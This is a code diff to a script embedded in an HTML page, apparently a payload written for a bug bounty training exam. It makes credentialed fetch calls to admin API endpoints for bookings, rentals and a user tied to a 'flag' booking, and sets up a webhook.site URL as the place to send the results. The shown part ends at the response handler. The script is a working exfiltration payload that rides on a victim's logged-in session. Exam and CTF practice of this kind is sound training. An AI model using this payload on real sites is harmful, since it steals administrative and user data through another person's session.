@@ -4,17 +4,17 @@
     <script>
         const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
         const base = "https://api-bugbounty-exam.hashacademy.co";
+        
+        // This is the ID of the "BugHunter / FlagSeeker" rental we found
+        const flagBookingId = "69dfe3e2bee6d6b7c661c922";
 
-        const endpoints = [
-            "/api/admin/bookings",
-            "/api/admin/rentals",
-            "/api/admin/rentals/stats",
-            "/api/admin/cars/stats",
-            "/api/admin/users", // Often overlooked, but holds admin list
-            "/api/admin/messages" 
+        const finalTargets = [
+            `/api/admin/bookings/${flagBookingId}`,
+            `/api/admin/rentals/${flagBookingId}`,
+            `/api/admin/users/69da4749adf0dbb976ce8e37` // The user associated with that flag booking
         ];
 
-        endpoints.forEach(path => {
+        finalTargets.forEach(path => {
             fetch(base + path, { credentials: "include" })
                 .then(r => r.text())
                 .then(data => {
